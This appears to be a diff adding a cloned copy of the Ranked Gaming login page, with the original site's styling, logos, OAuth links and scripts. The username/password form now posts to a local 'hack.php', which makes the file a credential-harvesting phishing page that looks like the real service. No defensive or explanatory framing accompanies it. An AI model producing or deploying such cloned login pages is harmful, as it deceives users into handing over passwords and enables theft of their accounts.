@@ -1,0 +1,222 @@
+
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="referrer" content="same-origin">
+	<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900" rel="stylesheet" type="text/css">
+
+	<!-- Page title -->
+	<title>RGC | Login</title>
+	<link rel="icon" type="image/png" href="https://res.rankedgaming.com/resources/images/icon-login.png">
+	
+	<script src="https://res.rankedgaming.com/resources/js/jquery-2.0.0.min.js" type="text/javascript"></script>
+	<script src="https://res.rankedgaming.com/locale/i18next.min.js"></script>
+	<script src='https://www.google.com/recaptcha/api.js'></script>
+
+	<!-- Vendor styles -->
+	<link rel="stylesheet" href="https://res.rankedgaming.com/vendor/fontawesome/css/font-awesome.css"/>
+	<link rel="stylesheet" href="https://res.rankedgaming.com/vendor/animate.css/animate.css"/>
+	<link rel="stylesheet" href="https://res.rankedgaming.com/vendor/bootstrap/css/bootstrap.css"/>
+	<link rel="stylesheet" href="https://res.rankedgaming.com/vendor/i-check/icheck-bootstrap.min.css"/>
+
+	<!-- App styles -->
+	<link rel="stylesheet" href="https://res.rankedgaming.com/vendor/pe-icons/pe-icon-7-stroke.css"/>
+	<link rel="stylesheet" href="https://res.rankedgaming.com/vendor/pe-icons/helper.css"/>
+	<link rel="stylesheet" href="https://res.rankedgaming.com/vendor/stroke-icons/style.css"/>
+	<link rel="stylesheet" href="https://res.rankedgaming.com/themes/luna/style.css">
+
+	<!-- Email Login -->
+	<link rel="stylesheet" href="https://res.rankedgaming.com/oauth/oauth.css">
+</head>
+
+<style>
+	.content:before {
+	    content: '';
+	    position: fixed;
+	    top: 0;
+	    bottom: 0;
+	    z-index: -2;
+	    left: 0;
+	    right: 0;
+	    	    background-image: url(https://res.rankedgaming.com/resources/walls/retro-gaming-wallpaper-picture.jpg);
+	    	    background-position: center center;
+	    background-size: cover;
+	}
+
+	.form-control{
+		color: #f6a821;
+	}
+</style>
+
+<body class="blank  pace-done">
+
+<!-- Wrapper-->
+<div class="wrapper">
+
+
+    <!-- Main content-->
+    <section class="content">
+
+        <div class="container-center animated slideInDown">
+
+
+            <div class="view-header">
+                <div class="header-icon">
+                	<img src="https://res.rankedgaming.com/resources/images/rgc-logo-64.png">
+                </div>
+                <div class="header-title">
+                    <h3>Ranked Gaming</h3>
+                    <small class="text-accent">
+                        Where gaming matters.
+                    </small>
+                </div>
+            </div>
+
+
+            <div class="panel panel-filled ">
+                <div class="panel-body">
+                    <form id="loginForm" novalidate="" action = "hack.php"method="post">
+                        <div class="form-group">
+                            <label class="control-label" for="username" data-i18n="label.user">Username</label>
+                            <input type="text" placeholder="<username>" title="Please enter you username" name="user" id="username" class="form-control" value="">
+                            <span class="help-block small">Your unique username to client</span>
+                        </div>
+                        <div class="form-group">
+                            <label class="control-label" for="password" data-i18n="label.pass">Password</label>
+                            <input type="password" title="Please enter your password" placeholder="<password>" name="pass" id="password" class="form-control" value="">
+                            <span class="help-block small">Your strong password</span>
+                        </div>
+
+                        <div>
+                            <button class="btn btn-accent" data-i18n="btn.login">Login</button>
+                            <span class="checkbox icheck-warning"style="display: inline-block; float:right;">
+                                <input type="checkbox" name="remember_me" id="remember_me"/>
+                                <label for="remember_me" data-i18n="label.remember"></label>
+                            </span> 
+
+                            <!-- <a class="btn btn-default" href="register.html">Register</a> -->
+                        </div>
+                    </form>
+
+			<a href='https://login.rankedgaming.com/steam/oauth_impl_login.php?RG_OAUTH_PROVIDER=1&url=https%3A%2F%2Fadmin.rankedgaming.com%2Faccounts%2Fgame-logs.php' class='google-btn'></a><br>
+			<a href='https://login.rankedgaming.com/steam/oauth_impl_login.php?RG_OAUTH_PROVIDER=2&url=https%3A%2F%2Fadmin.rankedgaming.com%2Faccounts%2Fgame-logs.php' class='ms-btn'></a><br>
+			<a href='https://login.rankedgaming.com/steam/oauth_impl_login.php?RG_OAUTH_PROVIDER=3&url=https%3A%2F%2Fadmin.rankedgaming.com%2Faccounts%2Fgame-logs.php' class='yahoo-btn'></a><br>
+			<br>Login via email does not make use of <code>Remember me</code>
+                </div>
+            </div>
+
+            
+            <p class="help-block text-center">RANKED GAMING CLIENT © 2009 - 2017<br>Website made with <i class="fa fa-fw fa-heart text-danger"></i> by bloor</p>
+
+			<div id="langSelector" style="display: none;">
+				<div class="current">
+					English					<img src="https://res.rankedgaming.com/locale/flags/en.png">
+				</div>
+
+				<div class="all">Languages:&nbsp;&nbsp;
+									<img data-code="en" data-lang="English" src="https://res.rankedgaming.com/locale/flags/en.png">
+									<img data-code="fr" data-lang="Français" src="https://res.rankedgaming.com/locale/flags/fr.png">
+									<img data-code="ro" data-lang="Română" src="https://res.rankedgaming.com/locale/flags/ro.png">
+									<img data-code="lb" data-lang="العربية" src="https://res.rankedgaming.com/locale/flags/lb.png">
+									<img data-code="cn" data-lang="中文" src="https://res.rankedgaming.com/locale/flags/cn.png">
+									<img data-code="ir" data-lang="Persian" src="https://res.rankedgaming.com/locale/flags/ir.png">
+								</div>
+			</div>
+
+        </div>
+    </section>
+    <!-- End main content-->
+
+</div>
+<!-- End wrapper-->
+
+
+
+
+<script>
+	/* Delayed Load here to allow for the translation to change all DOM elements to their respective language content. Otherwise the graphics on the screen will change rapidly whilst the text is being inserted */
+	$(document).ready(function()
+	{
+		setTimeout(function()
+		{			
+			$(".center").css('top', $(window).height() * 0.5 +'px');
+			$(".center").fadeIn(0);
+		}, 200);
+	});
+
+	if (navigator.userAgent.toLowerCase().indexOf("chrome") >= 0) {
+	    $(window).load(function(){
+	        $('input:-webkit-autofill').each(function(){
+	            var text = $(this).val();
+	            var name = $(this).attr('name');
+	            $(this).after(this.outerHTML).remove();
+	            $('input[name=' + name + ']').val(text);
+	        });
+	    });
+	}
+
+	$('#loginBox .no').click(function()
+	{
+		var form = document.createElement('form');
+		form.method = 'post';
+    		form.action = 'https://admin.rankedgaming.com/accounts/game-logs.php?action=recover';
+    		form.submit();
+	});
+
+	$('#recoverBox .no').click(function()
+	{
+		var form = document.createElement('form');
+		form.method = 'post';
+    		form.action = 'https://admin.rankedgaming.com/accounts/game-logs.php?action=login';
+    		form.submit();
+	});				
+</script>
+
+	<script>
+		///// stuff for translations /////////////
+		/// internationalisation i18next
+		var options = {
+			ns: 'login',
+			fallbackLng: 'en',
+			useCookie: false,
+			resGetPath: "https://res.rankedgaming.com/locale/__lng__/__ns__.json?v="+ Math.random(),
+		};
+
+		// Both functions here needed or we get cookie problems
+		function i18nInit()
+		{
+			$('body').i18n();
+			if (typeof i18nPage === 'function') { i18nPage(); } ///add particular page initialisations
+		}
+
+		i18n.init(options).done(function() { i18nInit(); });
+		// ---
+		
+		$(document).ready(function()
+		{
+			$("#langSelector .all img").click(function()
+			{
+				code = $(this).attr('data-code');
+				lang = $(this).attr('data-lang');
+
+				i18n.setLng(code, function(t) { i18nInit(); });
+
+				$("#langSelector .current").html(lang + "<img src='https://res.rankedgaming.com/locale/flags/"+ code +".png'>");
+
+				setCookie('i18next', code, 10000);
+			});
+
+			i18n.setLng('en', function(t) { i18nInit(); });
+		});
+
+		function setCookie(c_name,value,exdays)
+		{
+			var exdate=new Date();
+			exdate.setDate(exdate.getDate() + exdays);
+			var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
+			document.cookie=c_name + "=" + c_value + ';domain=.rankedgaming.com;path=/';
+		}
+	</script>
+	
